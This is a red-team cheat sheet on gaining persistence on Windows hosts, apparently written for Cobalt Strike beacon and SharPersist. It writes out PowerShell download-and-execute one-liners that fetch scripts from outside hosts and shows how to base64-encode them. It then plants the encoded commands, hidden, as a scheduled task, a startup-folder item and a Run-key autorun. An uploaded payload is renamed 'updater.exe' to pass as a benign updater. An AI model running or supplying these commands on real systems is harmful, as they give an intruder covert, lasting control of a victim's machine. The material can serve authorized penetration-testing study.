# Host Persistence 

NORMAL USER

# Default location for powershell

    C:\windows\syswow64\windowspowershell\v1.0\powershell
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Encode the payload for handling extra quotes
# Powershell

    PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
    PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Linux 

    $ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Final Command

    powershell -nop -enc <BASE64_ENCODED_PAYLOAD>

# Persistence - Task Scheduler

    beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA" -n "Updater" -m add -o hourly

# Persistence - Startup Folder

    beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA" -f "UserEnvSetup" -m add

# Persistence - Registry Autorun

    beacon> cd C:\ProgramData
    beacon> upload C:\Payloads\http_x64.exe
    beacon> mv http_x64.exe updater.exe
    beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
